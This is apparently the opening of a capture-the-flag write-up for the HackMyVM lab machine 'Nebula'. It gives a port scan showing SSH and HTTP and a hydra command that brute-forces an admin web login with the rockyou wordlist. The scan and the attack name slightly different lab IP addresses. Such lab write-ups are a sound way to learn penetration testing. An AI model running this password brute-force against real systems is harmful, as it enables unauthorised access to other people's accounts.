# Nebula

2025.03.24 https://hackmyvm.eu/machines/machine.php?vm=Nebula

[video]()

## Ip

192.168.5.39

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```
hydra -t 100 -l admin -P /usr/share/wordlists/rockyou.txt 192.168.5.40 -f http-post-form "/login/index.php:username=^USER^&password=^PASS^:F=Login failed"
```
